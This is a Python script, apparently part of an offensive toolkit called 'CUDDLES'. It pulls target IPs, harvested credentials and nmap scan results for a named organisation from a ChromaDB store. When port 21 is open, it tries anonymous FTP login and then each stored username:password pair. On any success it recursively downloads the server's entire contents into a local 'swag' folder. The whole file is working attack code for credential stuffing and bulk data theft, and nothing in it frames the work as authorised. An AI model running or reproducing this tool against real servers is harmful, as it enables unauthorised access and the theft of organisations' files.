import chromadb
import os
import sys
from ftplib import FTP

# Ensure the OpenAI API key is set
api_key = os.getenv("OPENAI_API_KEY")

# Function to display ASCII art
def cuddles_art():
    art = """
 ██████ ██    ██ ██████  ██████  ██      ███████ ███████     
██      ██    ██ ██   ██ ██   ██ ██      ██      ██          
██      ██    ██ ██   ██ ██   ██ ██      █████   ███████     
██      ██    ██ ██   ██ ██   ██ ██      ██           ██     
 ██████  ██████  ██████  ██████  ███████ ███████ ███████     
                                                             
                                                                                       
"""
    return art

# Function to connect to ChromaDB and retrieve collection data
def get_chromadb_data(collection_name):
    chromadb_client = chromadb.PersistentClient(path="./data")
    collection = chromadb_client.get_or_create_collection(name=collection_name.lower().replace(' ', '_'))
    # Fetching all documents from the collection
    documents = collection.get(ids=None)
    return collection, documents['documents']

# Function to attempt anonymous FTP login
def attempt_anonymous_ftp_login(ip):
    try:
        ftp = FTP(ip)
        ftp.login()
        print(f"Success: Logged in to {ip} as anonymous")
        download_all_files(ftp, ip)
        ftp.quit()
        return True
    except Exception as e:
        print(f"Anonymous login failed for {ip}: {str(e)}")
        return False

# Function to attempt FTP login with provided credentials
def attempt_ftp_login(ip, credentials):
    for cred in credentials:
        username, password = cred.split(':')
        try:
            ftp = FTP(ip)
            ftp.login(username, password)
            print(f"Success: Logged in to {ip} with {username}:{password}")
            download_all_files(ftp, ip)
            ftp.quit()
            return True
        except Exception as e:
            print(f"Failed: {username}:{password} for {ip}: {str(e)}")
    return False

# Function to download all files and directories recursively
def download_all_files(ftp, ip):
    base_dir = f'./swag/ftp/{ip}'
    if not os.path.exists(base_dir):
        os.makedirs(base_dir)

    def _download_dir(remote_dir, local_dir):
        if not os.path.exists(local_dir):
            os.makedirs(local_dir)

        ftp.cwd(remote_dir)
        file_list = ftp.nlst()

        for file in file_list:
            local_file = os.path.join(local_dir, file)
            if _is_directory(file):
                _download_dir(file, local_file)
            else:
                with open(local_file, 'wb') as f:
                    ftp.retrbinary(f'RETR {file}', f.write)
        ftp.cwd('..')

    def _is_directory(remote_file):
        try:
            ftp.cwd(remote_file)
            ftp.cwd('..')
            return True
        except Exception:
            return False

    _download_dir('/', base_dir)

def main():
    print(cuddles_art())
    print("Starting the process to check FTP access using provided credentials.")

    # Retrieve organisation name from command-line arguments
    if len(sys.argv) != 2:
        print("Usage: python3 ftp.py <organisation_name>")
        return
    org_name = sys.argv[1]

    # Stage One: Connect to ChromaDB and retrieve data
    collection, documents = get_chromadb_data(org_name)
    if not documents:
        print(f"No data found for organisation '{org_name}'. Exiting.")
        return

    # Debugging: Print fetched documents to check their structure
    print("Fetched documents:", documents)

    # Extract IP addresses, nmap results, and credentials from documents
    ips_and_domains = []
    credentials = []
    scan_results = ""
    for doc in documents:
        print("Document text:", doc)  # Debugging: Print each document text
        if 'Known domains and IPs' in doc:
            ips_and_domains_str = doc.split('Known domains and IPs: ')[-1]
            ips_and_domains.extend(ips_and_domains_str.split(','))
        if 'Known credentials' in doc:
            credentials_str = doc.split('Known credentials: ')[-1]
            credentials.extend(credentials_str.split(','))
        if 'Scan Results:' in doc:
            scan_results = doc.split('Scan Results:\n')[-1]

    if not ips_and_domains:
        print(f"No IP addresses or domains found for organisation '{org_name}'. Exiting.")
        return

    if not credentials:
        print(f"No credentials provided for organisation '{org_name}'. Exiting.")
        return

    if not scan_results:
        print(f"No scan results found for organisation '{org_name}'. Exiting.")
        return

    # Parse the nmap results for open ports
    open_ports = []
    for line in scan_results.split('\n'):
        if '/tcp' in line and 'open' in line:
            port = line.split('/')[0].strip()
            open_ports.append(int(port))

    print(f"Open ports: {open_ports}")

    # Check if port 21 is open
    if 21 in open_ports:
        for ip in ips_and_domains:
            print(f"Attempting anonymous FTP login to {ip}...")
            if attempt_anonymous_ftp_login(ip):
                print(f"Successfully logged into {ip} via anonymous FTP.")
                return
            
            print(f"Attempting FTP login with credentials to {ip}...")
            if attempt_ftp_login(ip, credentials):
                print(f"Successfully logged into {ip} via FTP with credentials.")
                return

        print("Failed to log into any IPs via FTP.")
    else:
        print("Port 21 is not open on any provided IPs.")

if __name__ == "__main__":
    main()
